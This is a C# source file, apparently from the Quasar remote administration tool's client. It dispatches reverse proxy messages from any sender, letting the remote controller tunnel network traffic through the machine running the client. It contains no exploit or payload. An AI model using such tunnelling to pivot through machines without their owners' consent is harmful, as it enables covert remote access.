using Quasar.Client.Networking;
using Quasar.Client.ReverseProxy;
using Quasar.Common.Messages;
using Quasar.Common.Messages.ReverseProxy;
using Quasar.Common.Networking;

namespace Quasar.Client.Messages
{
    public class ReverseProxyHandler : MessageProcessorBase<object>
    {
        private readonly QuasarClient _client;

        public ReverseProxyHandler(QuasarClient client) : base(false)
        {
            _client = client;
        }

        public override bool CanExecute(IMessage message) => message is ReverseProxyConnect ||
                                                             message is ReverseProxyData ||
                                                             message is ReverseProxyDisconnect;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case ReverseProxyConnect msg:
                    Execute(sender, msg);
                    break;
                case ReverseProxyData msg:
                    Execute(sender, msg);
                    break;
                case ReverseProxyDisconnect msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, ReverseProxyConnect message)
        {
            _client.ConnectReverseProxy(message);
        }

        private void Execute(ISender client, ReverseProxyData message)
        {
            ReverseProxyClient proxyClient = _client.GetReverseProxyByConnectionId(message.ConnectionId);

            proxyClient?.SendToTargetServer(message.Data);
        }
        private void Execute(ISender client, ReverseProxyDisconnect message)
        {
            ReverseProxyClient socksClient = _client.GetReverseProxyByConnectionId(message.ConnectionId);

            socksClient?.Disconnect();
        }

        protected override void Dispose(bool disposing)
        {
            
        }
    }
}
